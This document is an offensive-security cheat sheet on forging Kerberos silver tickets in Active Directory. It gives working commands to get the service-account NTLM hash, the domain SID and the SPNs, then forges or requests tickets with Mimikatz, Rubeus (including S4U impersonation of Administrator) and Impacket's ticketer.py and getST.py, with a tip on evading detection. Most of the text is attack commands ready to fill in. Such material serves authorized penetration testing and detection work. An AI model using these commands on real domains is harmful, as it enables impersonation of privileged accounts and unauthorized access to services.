# Silver Ticket

## Requirements:

### 1) SPN password NTLM hash 

https://www.browserling.com/tools/ntlm-hash

OR Use this Python one-liner instead

    python3 -c "from passlib.hash import nthash; print(nthash.hash('YourPassword'))"

Another one-liner

    echo -n 'YourPassword' | iconv -t UTF-16LE | openssl md4

### 2) Domain SID

Windows

    Get-ADDomain

Linux

    rpcclient -U "user.name" -c "lsaquery" IP

### 3) Target SPN (mssql/domain.local)

Windows

    Get-ADUser -Filter {SamAccountName -eq "svc_mssql"} -Properties ServicePrincipalNames

## Steps:

### 1) Create ST

/rc4 take the service account (generally the machine account) hash. /aes128 or /aes256 can be used for AES keys.

    Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:domain.local /sid:<domain_SID> /target:<target>.domain.local /service:CIFS /rc4:<account_hash> /ptt"'

Requesting a ST with a valid TGT can be performed with Rubeus like this:

    .\Rubeus.exe asktgs /ticket:tgt.kirbi /service:LDAP/dc.domain.local,cifs/dc.domain.local /ptt

Another solution, if you don't have the NT hash or the AES keys of the service but you have a TGT for the service account, is to impersonate an account via a request for a service ticket through S4USelf to an alternative service (and the opsec is better since the PAC is consistent):

    .\Rubeus.exe s4u /self /impersonateuser:"Administrator" /altservice:"cifs/target.domain.local" /ticket:"<base64_target_TGT>" /nowrap

## Linux

    ticketer.py -domain domain.local -domain-sid <domain_SID> -spn 'cifs/target' -nthash <account_hash> -user-id <target_RID> -duration <ticket_lifetime_in_day> <target_user>

Another solution, if you don't have the NT hash or the AES keys of the service but you have a TGT for the service account, is to impersonate an account via a request for a service ticket through S4USelf to an alternative service (and the opsec is better since the PAC is consistent):

    export KRB5CCNAME=./target_TGT.ccache
    getST.py -self -impersonate "Administrator" -altservice "cifs/target.domain.local" -k -no-pass "domain.local"/'target$'

MISC

    impacket-ticketer -nthash MACHINE_NT_HASH -domain-sid DOMAIN_SID -domain DOMAIN ANY_USER

    mimikatz "kerberos::golden /sid:CURRENT_USER_SID /domain:DOMAIN_SID /target:TARGET_SERVER /service:TARGET_SERVICE /aes256:COMPUTER_AES256_KEY /user:ANY_USER /ptt"
